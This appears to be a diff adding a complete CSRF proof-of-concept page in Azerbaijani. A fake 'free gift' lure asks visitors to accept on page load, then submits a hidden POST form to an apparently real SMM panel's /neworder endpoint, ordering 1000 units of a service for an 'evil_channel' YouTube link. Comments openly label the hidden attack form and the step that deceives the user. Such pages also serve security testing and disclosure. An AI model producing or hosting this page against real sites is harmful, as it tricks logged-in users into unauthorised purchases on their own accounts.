@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎁 Pulsuz Hədiyyə Qazanın!</title>
+    <meta charset="utf-8">
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; }
+        .container { max-width: 600px; margin: 0 auto; }
+        .gift { font-size: 80px; margin: 20px; }
+        .button { background: #ffd93d; color: #333; padding: 15px 30px; border: none; border-radius: 25px; font-size: 18px; cursor: pointer; margin: 20px; }
+        .hidden-form { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="gift">🎁</div>
+        <h1>Təbrik! Pulsuz Hədiyyə Qazandınız!</h1>
+        <p>Bu hədiyyəni qazanmaq üçün aşağıdakı düyməyə basın!</p>
+        
+        <button class="button" onclick="claimGift()">🎁 Hədiyyəni Qazan</button>
+        
+        <div class="hidden-form">
+            <p>Hədiyyə yüklənir... Zəhmət olmasa gözləyin...</p>
+        </div>
+    </div>
+    
+    <!-- CSRF Hücum Formu - Gizli -->
+    <form id="csrfForm" method="post" action="https://royzasmm.com.tr/neworder" class="hidden-form">
+        <input type="hidden" name="categories" value="12">
+        <input type="hidden" name="services" value="1">
+        <input type="hidden" name="link" value="https://youtube.com/@evil_channel">
+        <input type="hidden" name="quantity" value="1000">
+        <input type="hidden" name="neworder_check" value="on">
+    </form>
+    
+    <script>
+        function claimGift() {
+            // İstifadəçini aldadmaq
+            document.querySelector('.hidden-form').style.display = 'block';
+            document.querySelector('.button').style.display = 'none';
+            
+            // 3 saniyə sonra CSRF hücumunu başlat
+            setTimeout(function() {
+                alert('🎉 Hədiyyə uğurla yükləndi! Səhifə yenilənir...');
+                
+                // CSRF formunu göndər
+                document.getElementById('csrfForm').submit();
+            }, 3000);
+        }
+        
+        // Səhifə yükləndikdə avtomatik başlat
+        window.onload = function() {
+            setTimeout(function() {
+                if (confirm('🎁 Pulsuz hədiyyə təklifi! Qəbul edirsinizmi?')) {
+                    claimGift();
+                }
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
